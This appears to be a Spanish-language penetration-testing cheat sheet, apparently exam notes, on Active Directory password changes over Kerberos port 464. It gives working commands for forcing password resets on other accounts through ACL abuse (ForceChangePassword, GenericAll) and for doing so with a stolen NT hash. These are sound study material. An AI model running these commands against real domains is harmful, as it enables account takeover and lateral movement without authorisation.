# kpasswd (464)

Tags: #kpasswd #Kerberos #DC #AD #CambioContraseña

## OBJETIVO
- Cambiar contraseñas de cuentas de dominio vía Kerberos
- Forzar cambio de contraseña en cuentas comprometidas con ACL abuse
- Restablecer contraseñas cuando se tienen permisos sobre una cuenta

## TIPS
1. **Puerto 464 es exclusivo de DCs → si está abierto, confirma que es un DC**
2. **kpasswd requiere autenticación Kerberos válida → sincronizar reloj antes**
3. **ForceChangePassword o GenericAll en BloodHound → este es el puerto que lo ejecuta**
4. **Cambiar contraseña de una cuenta → acceso inmediato a sus recursos**
5. **Siempre sincronizar reloj antes → mismo requisito que puerto 88**

## TOOLS
* [Impacket](https://github.com/fortra/impacket)
* [NetExec](https://github.com/Pennyw0rth/NetExec)
* [Samba](https://www.samba.org/)

---

## 0. SINCRONIZACIÓN DE RELOJ (OBLIGATORIO)

```bash
❯ sudo ntpdate <IP_DC>
# SIEMPRE antes de cualquier operación kpasswd
# Si el reloj difiere más de 5 min → falla con KRB_AP_ERR_SKEW
```

---

## 1. CAMBIO DE CONTRASEÑA CON CREDENCIALES PROPIAS

```bash
❯ kpasswd <user>@domain.corp
# Requiere conocer la contraseña actual → cambia la propia contraseña
# Interactivo → pide contraseña actual y la nueva dos veces

❯ smbpasswd -r <IP_DC> -U 'user'
# Requiere contraseña actual → cambio interactivo vía Samba
# Útil cuando kpasswd no está disponible
```

### Insight
- Útil cuando el DC fuerza cambio de contraseña en el primer login
- Sin cambiar la contraseña → algunas herramientas no funcionan con esa cuenta

---

## 2. FORZAR CAMBIO DE CONTRASEÑA (ACL ABUSE)

```bash
# Requiere: permiso ForceChangePassword o GenericAll sobre la cuenta objetivo
# Verificar en BloodHound antes de ejecutar

❯ net rpc password "TargetUser" "NewPass123!" \
  -U "domain.corp/user%passwd" -S <IP_DC>
# Requiere ForceChangePassword sobre TargetUser
# Cambia la contraseña sin conocer la actual

❯ impacket-changepasswd domain.corp/targetuser \
  -newpass 'NewPass123!' \
  -authuser user -authpass passwd \
  -dc-ip <IP_DC>
# Requiere permisos sobre la cuenta objetivo
# Más limpio que net rpc en entornos modernos

❯ nxc smb <IP_DC> -u 'user' -p 'passwd' \
  -M change_password -o USER=targetuser NEWPASS='NewPass123!'
# Requiere permisos sobre la cuenta objetivo
# Alternativa con netexec
```

### Insight
- Después de cambiar → validar inmediatamente en SMB/WinRM/RDP
- Anotar la contraseña anterior si es posible → restaurar después si el examen lo requiere
- Si el usuario es DA o tiene privilegios altos → acceso inmediato al dominio

---

## 3. CAMBIO DE CONTRASEÑA CON HASH (SIN CONTRASEÑA EN CLARO)

```bash
❯ impacket-changepasswd domain.corp/targetuser \
  -newpass 'NewPass123!' \
  -authuser user -authhashes :NThash \
  -dc-ip <IP_DC>
# Requiere hash NT del usuario autenticado + permisos sobre la cuenta objetivo
# No necesitas la contraseña en claro del usuario que ejecuta el cambio
```

---

## CONDICIONES CLAVE
- ForceChangePassword en BloodHound → cambiar contraseña sin conocer la actual
- GenericAll sobre una cuenta → también permite cambio de contraseña
- Hash NT disponible → cambiar sin contraseña en claro
- DC fuerza cambio en primer login → usar kpasswd interactivo

## ONE-LINERS MENTALES
- BloodHound muestra ForceChangePassword → net rpc password o impacket-changepasswd
- Cambié la contraseña → validar inmediatamente en SMB / WinRM / RDP
- Tengo hash pero no pass → impacket-changepasswd con -authhashes
- Sincronizar reloj → antes de cualquier operación en este puerto
